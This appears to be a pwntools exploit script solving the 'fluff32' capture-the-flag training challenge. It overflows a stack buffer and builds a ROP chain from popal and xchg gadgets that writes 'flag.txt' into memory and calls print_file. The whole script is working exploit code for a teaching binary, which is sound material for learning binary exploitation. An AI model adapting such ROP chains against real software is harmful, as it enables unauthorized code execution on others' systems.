#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fluff32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fluff32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  '.'

"""
0x08048555: xchg byte ptr [ecx], dl; ret; 
0x08048527: popal; cld; ret; 
0x080485bb: pop ebp; ret; 

"""

io = start()

print_file = p32(0x80483d0)
dss = 0x0804a018 + 0x20
popal = p32(0x08048527)    # pops values from stack in order EDI, ESI, EBP, ESP, EBX, EDX, ECX and EAX
xchg_ecx_edx = p32(0x08048555)
pop_ret = p32(0x080485bb)

#for k,v in exe.symbols.items():
#	print(k, v)

def popal_func(string, section):
	s = ""
	s += popal
	s += p32(0x0)
	s += p32(0x0)
	s += p32(0x0)
	s += p32(0x0)
	s += p32(0x0)
	s += string
	s += p32(section)
	s += p32(0x0)

	return s

def mov_flag(string, section):

	s = ""
	s += popal_func(string, section)
	s += xchg_ecx_edx

	return s

buf = ""
buf += "\x90"*44
buf += mov_flag("ffff", dss)
buf += mov_flag("llll", dss+1)
buf += mov_flag('aaaa', dss+2)
buf += mov_flag('gggg', dss+3)
buf += mov_flag('....', dss+4)
buf += mov_flag('tttt', dss+5)
buf += mov_flag('xxxx', dss+6)
buf += mov_flag('tttt', dss+7)

# calling print_file func
buf += print_file
buf += pop_ret
buf += p32(dss)

write("in.txt", buf)

io.sendline(buf)
io.interactive()

